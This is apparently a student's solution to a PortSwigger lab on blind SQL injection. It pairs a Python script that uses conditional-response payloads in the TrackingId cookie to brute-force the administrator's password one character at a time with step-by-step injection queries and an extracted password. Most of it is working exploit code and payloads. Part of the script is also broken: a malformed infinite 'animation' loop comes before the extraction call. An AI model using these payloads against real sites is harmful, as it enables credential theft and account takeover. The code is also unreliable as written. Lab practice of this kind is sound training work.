#https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
#Lab: Blind SQL injection with conditional responses

import sys
import requests
import urllib3
import urllib
from urlparse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url ,TrackingId, SessionId):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.quote_plus(sqli_payload)
            #cookies = {'TrackingId': 'ci4xeBOV6vLh7GkX' + sqli_payload_encoded, 'session': '9TMDK6cH4SAjIDYM4vie5vLczNYGRfYl'}
	    cookies = {'TrackingId': TrackingId + sqli_payload_encoded, 'session': SessionId}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    #if len(sys.argv) != 2:
        #print("(+) Usage: %s <url>" % sys.argv[0])
        #print("(+) Example: %s www.example.com" % sys.argv[0])

    #url = sys.argv[1]
    url = input("\n Enter the url :")
    TrackingId = input("\n Enter the TrackingId :")
    SessionId = input("\n Enter the SessionId :")
    print("\n (+) Retrieving administrator password...")    
    while True:
	animation = "|/-\\"
	for i in range(1,4):
	    for j in len(animation):
		sys.stdout.write("\n (+) Retrieving administrator password %s" %i)
    sqli_password(url, TrackingId, SessionId)
	

if __name__ == "__main__":
    main()





Lab 11 - Blind SQL injection with conditional responses

Vulnerable parameter - tracking cookie

End Goals:
1) Enumerate the password of the administrator
2) Log in as the administrator user

Analysis:

1) Confirm that the parameter is vulnerable to blind SQLi

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'

-> If this tracking id exists -> query returns value -> Welcome back message
-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'
-> TRUE -> Welcome back

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'
-> FALSE -> no Welcome back

2) Confirm that we have a users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'
-> users table exists in the database.

3) Confirm that username administrator exists users table

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'
-> administrator user exists

4) Enumerate the password of the administrator user

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
-> password is exactly 20 characters

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'

1 2 3 45 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
52rqbjtjpa749cy0bv6s


script.py url